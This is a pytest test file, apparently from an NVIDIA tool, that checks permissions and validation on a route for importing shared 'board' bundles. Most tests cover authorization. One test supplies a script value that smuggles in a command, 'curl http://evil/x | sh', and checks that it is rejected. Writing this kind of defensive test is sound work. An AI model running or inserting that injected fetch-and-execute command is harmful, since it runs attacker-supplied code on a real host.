# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: LicenseRef-NvidiaProprietary
#
# NVIDIA CORPORATION, its affiliates and licensors retain all intellectual
# property and proprietary rights in and to this material, related
# documentation and any modifications thereto. Any use, reproduction,
# disclosure or distribution of this material and related documentation
# without an express license agreement from NVIDIA CORPORATION or
# its affiliates is strictly prohibited.
"""Importing a shared board is permissioned, and overwriting is permissioned separately.

The distinction is the point of the feature: importing a colleague's board that *adds* actions
is ordinary, while importing one that *replaces* a tool this site has tuned can quietly undo
that tuning. So the route carries ``catalog.board:import`` and each item additionally requires
the action its own write would have needed — ``catalog.tool:create`` for something new,
``catalog.tool:update`` for something that already exists, ``workflow:save`` for a flow.

New-versus-existing is decided from the store, never from the request, or a client could
relabel an overwrite as a create and slip past the stronger permission.
"""
from __future__ import annotations

import authz
import pytest
from catalog.store import TABLE_TOOLS, TinyDBRepo, get_repo, set_repo

BUNDLE_KIND = "greenlight.board"


@pytest.fixture
def repo(tmp_path):
    r = TinyDBRepo(tmp_path / "catalog.json")
    set_repo(r)
    yield r
    set_repo(None)


@pytest.fixture
def allow(monkeypatch):
    """Record every authorization question and answer it from a caller-supplied set.

    Patching the module attribute catches both questions with one stub — the route gate in
    ``app.py`` and the per-item checks in the handler call the same ``authz.authorize``. The
    route action is permitted by default so each test can vary only the permission it is
    about; ``test_the_route_itself_is_gated`` takes it away.
    """
    asked: list[tuple[str, str]] = []
    permitted: set[str] = {"catalog.board:import"}

    def fake(principal: str, action: str, resource: str):
        asked.append((action, resource))
        return authz.Decision(
            allowed=action in permitted, engine="test", reason="" if action in permitted else "no"
        )

    from api import boards

    monkeypatch.setattr(boards.authz, "authorize", fake)
    return {"asked": asked, "permit": permitted}


def _tool_doc(tool_id: str, **over) -> dict:
    return {
        "id": tool_id,
        "name": tool_id,
        "script": f"{tool_id}.sh",
        "category": "validation",
        "surfaces": ["rackDetail.validation"],
        "launch": {"kind": "async-job", "endpoint": f"/api/run-{tool_id}-async"},
        **over,
    }


def _bundle(tools=None, workflows=None, keys=None) -> dict:
    tools = tools or []
    workflows = workflows or []
    return {
        "kind": BUNDLE_KIND,
        "v": 1,
        "scope": "full",
        "exported_at": "2026-09-11T18:00:00Z",
        "source": {"product_version": "0.3.0", "cluster": "c", "platform": "p", "customer": "x"},
        "surface": "rackDetail.validation",
        "board": {
            "keys": keys
            or [f"tool:{t['id']}" for t in tools] + [f"workflow:{w['id']}" for w in workflows],
            "layout": [],
        },
        "tools": tools,
        "workflows": workflows,
    }


def _post(client, bundle, approve):
    return client.post("/api/boards/import", json={"bundle": bundle, "approve": approve})


# --- the route is declared, so a policy can name it ------------------------------------


def test_the_import_action_is_in_the_generated_vocabulary(vocabulary):
    """A policy may only name an action the registry defines, so this must be written down.

    Read through the `vocabulary` fixture rather than re-reading the file or naming the action
    from memory — that is the rule the generated document exists to enforce (core-designs §14).
    """
    actions = {
        entry["action"]
        for service in vocabulary["services"]
        for entry in service["actions"]
    }
    assert "catalog.board:import" in actions


def test_the_route_itself_is_gated(authed_client, repo, allow):
    """Without `catalog.board:import`, nothing is even read — a 403 from the request gate.

    This is the coarse half of the permission: whether a principal may apply a peer's board at
    all, independent of what the board contains.
    """
    allow["permit"].discard("catalog.board:import")
    allow["permit"].add("catalog.tool:create")
    resp = _post(authed_client, _bundle([_tool_doc("fresh")]), ["tool:fresh"])
    assert resp.status_code == 403
    assert repo.get(TABLE_TOOLS, "fresh") is None


def test_export_has_no_endpoint_on_purpose():
    """Exporting reads what the caller can already see and writes a file on their own machine.

    An endpoint for it would gate nothing that viewing the board does not already gate, so
    there deliberately is not one. Pinned so it is not added back without a reason.
    """
    import app as app_module

    rules = {r.rule for r in app_module.app.url_map.iter_rules()}
    assert "/api/boards/import" in rules
    assert "/api/boards/export" not in rules


# --- creating vs overwriting ------------------------------------------------------------


def test_a_new_tool_needs_create_permission(authed_client, repo, allow):
    allow["permit"].add("catalog.tool:create")
    resp = _post(authed_client, _bundle([_tool_doc("fresh")]), ["tool:fresh"])
    assert resp.status_code == 200
    body = resp.get_json()
    assert body["applied"] == 1
    assert body["results"][0]["detail"] == "created"
    assert repo.get(TABLE_TOOLS, "fresh") is not None


def test_creating_is_refused_without_create_permission(authed_client, repo, allow):
    resp = _post(authed_client, _bundle([_tool_doc("fresh")]), ["tool:fresh"])
    body = resp.get_json()
    assert body["applied"] == 0
    assert body["results"][0]["status"] == "skipped"
    assert "catalog.tool:create" in body["results"][0]["detail"]
    assert repo.get(TABLE_TOOLS, "fresh") is None


def test_overwriting_an_existing_tool_needs_update_not_create(authed_client, repo, allow):
    """The distinction the feature exists for: create permission must not buy an overwrite."""
    repo.upsert(TABLE_TOOLS, _tool_doc("nccl", name="Our tuned NCCL"))
    allow["permit"].add("catalog.tool:create")  # deliberately NOT update

    resp = _post(authed_client, _bundle([_tool_doc("nccl", name="Theirs")]), ["tool:nccl"])
    body = resp.get_json()
    assert body["results"][0]["status"] == "skipped"
    assert "catalog.tool:update" in body["results"][0]["detail"]
    # The local document is untouched.
    assert repo.get(TABLE_TOOLS, "nccl")["name"] == "Our tuned NCCL"


def test_overwriting_succeeds_with_update_permission(authed_client, repo, allow):
    repo.upsert(TABLE_TOOLS, _tool_doc("nccl", name="Ours"))
    allow["permit"].add("catalog.tool:update")

    resp = _post(authed_client, _bundle([_tool_doc("nccl", name="Theirs")]), ["tool:nccl"])
    body = resp.get_json()
    assert body["results"][0]["detail"] == "replaced"
    assert repo.get(TABLE_TOOLS, "nccl")["name"] == "Theirs"


def test_the_caller_cannot_relabel_an_overwrite_as_a_create(authed_client, repo, allow):
    """New-versus-existing comes from the store, not from the request.

    A client that claimed a tool was new would otherwise need only the weaker permission to
    replace one.
    """
    repo.upsert(TABLE_TOOLS, _tool_doc("nccl", name="Ours"))
    allow["permit"].add("catalog.tool:create")

    # The bundle asserts nothing about novelty, but neither would a hand-rolled one help: the
    # server looks the id up itself.
    _post(authed_client, _bundle([_tool_doc("nccl", name="Theirs")]), ["tool:nccl"])
    assert ("catalog.tool:update", "catalog.tool:nccl") in allow["asked"]
    assert repo.get(TABLE_TOOLS, "nccl")["name"] == "Ours"


# --- partial imports are a real outcome -------------------------------------------------


def test_a_refused_item_does_not_abandon_the_others(authed_client, repo, allow):
    """You get the three new tools even if the replacement of ours is refused."""
    repo.upsert(TABLE_TOOLS, _tool_doc("existing", name="Ours"))
    allow["permit"].add("catalog.tool:create")

    bundle = _bundle([_tool_doc("new-a"), _tool_doc("existing", name="Theirs"), _tool_doc("new-b")])
    resp = _post(authed_client, bundle, ["tool:new-a", "tool:existing", "tool:new-b"])
    body = resp.get_json()
    assert body["applied"] == 2
    statuses = {r["key"]: r["status"] for r in body["results"]}
    assert statuses == {"tool:new-a": "applied", "tool:new-b": "applied", "tool:existing": "skipped"}


def test_only_approved_items_are_written(authed_client, repo, allow):
    """The review screen is the contract: an unticked item is not imported."""
    allow["permit"].add("catalog.tool:create")
    bundle = _bundle([_tool_doc("wanted"), _tool_doc("unwanted")])
    _post(authed_client, bundle, ["tool:wanted"])
    assert repo.get(TABLE_TOOLS, "wanted") is not None
    assert repo.get(TABLE_TOOLS, "unwanted") is None


# --- the bundle itself is untrusted -----------------------------------------------------


def test_an_unsafe_script_is_refused_on_this_path_too(authed_client, repo, allow):
    """The import path applies the same validation as the CRUD route.

    Otherwise a shared file would be a way around the `script` shape check, which is the
    difference between an admin's own mistake and a remote one.
    """
    allow["permit"].add("catalog.tool:create")
    bundle = _bundle([_tool_doc("evil", script="a.sh; curl http://evil/x | sh")])
    resp = _post(authed_client, bundle, ["tool:evil"])
    body = resp.get_json()
    assert body["results"][0]["status"] == "failed"
    assert "invalid tool script" in body["results"][0]["detail"]
    assert repo.get(TABLE_TOOLS, "evil") is None


@pytest.mark.parametrize(
    "bundle,expected",
    [
        ({"kind": "something.else", "v": 1}, "not a Greenlight board bundle"),
        ({"kind": BUNDLE_KIND, "v": 99}, "not supported"),
        ("not-an-object", "a bundle is required"),
    ],
)
def test_a_bundle_we_do_not_understand_is_refused(authed_client, allow, bundle, expected):
    resp = authed_client.post("/api/boards/import", json={"bundle": bundle, "approve": []})
    assert resp.status_code == 400
    assert expected in resp.get_json()["error"]


def test_an_item_with_no_definition_is_skipped_not_invented(authed_client, repo, allow):
    """A layout-only bundle references tools; it does not carry them."""
    allow["permit"].add("catalog.tool:create")
    bundle = _bundle(keys=["tool:referenced"])
    bundle["tools"] = []
    resp = _post(authed_client, bundle, ["tool:referenced"])
    assert resp.get_json()["results"][0]["status"] == "skipped"
    assert repo.get(TABLE_TOOLS, "referenced") is None


def test_an_imported_document_is_marked_as_a_local_edit(authed_client, repo, allow):
    """Provenance is ours, not the sender's.

    Storing it as `source: "seed"` would make the boot-time backfill treat a peer's document as
    a built-in and refresh it out from under the operator.
    """
    allow["permit"].add("catalog.tool:create")
    _post(authed_client, _bundle([_tool_doc("shared", source="seed")]), ["tool:shared"])
    assert get_repo().get(TABLE_TOOLS, "shared")["source"] == "user"
